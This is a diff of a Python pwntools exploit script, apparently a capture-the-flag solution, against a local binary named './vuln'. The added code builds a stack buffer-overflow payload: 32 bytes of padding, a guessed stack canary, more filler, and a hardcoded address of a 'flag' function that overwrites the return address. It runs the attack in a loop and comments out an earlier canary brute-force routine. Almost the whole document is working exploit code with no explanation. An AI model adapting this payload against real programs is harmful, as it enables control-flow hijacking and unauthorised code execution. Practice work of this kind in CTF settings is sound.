@@ -2,6 +2,7 @@
 
 from pwn import *
 
+context.log_level = 'error'
 
 def canary_brute():
 	result = ""
@@ -23,25 +24,37 @@ def canary_brute():
 
 	return u32(result)
 
+def exploit():
+
+	#canary = 0x48366137
+	canary = 'CCCC'
+	#load
+	p = process('./vuln')
+	e = ELF('./vuln')
+
+	#addr
+	flag = 0x565557ed
+	#send length of entry
+	p.sendlineafter('> ', '56')
+
+	offset = 32
+
+	#payload
+	payload = ''
+	payload+= 'A'*offset
+	payload+= canary
+	payload+= 'B'*16
+	payload+= p32(flag)
+	p.sendlineafter('Input> ', payload)
+
+	print p.recv()
+
+	p.close()
+
 if __name__ == '__main__':
-	canary = canary_brute()
-	log.info("Canary Found        " + hex(canary))
+	#canary = canary_brute()
+	#log.info("Canary Found        " + hex(canary))
+	
+	for i in range(1000):
+		exploit()
 
-# #load
-# p = process('./vuln')
-# e = ELF('./vuln')
-
-# #send length of entry
-# p.sendlineafter('> ', '100')
-
-#AAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
-# offset = 32
-
-# #payload
-# payload = ''
-# payload+= 'A'*offset
-# payload+= 'CCCC'
-# payload+= 'A'*1000
-# p.sendlineafter('Input> ', payload)
-
-# p.interactive()
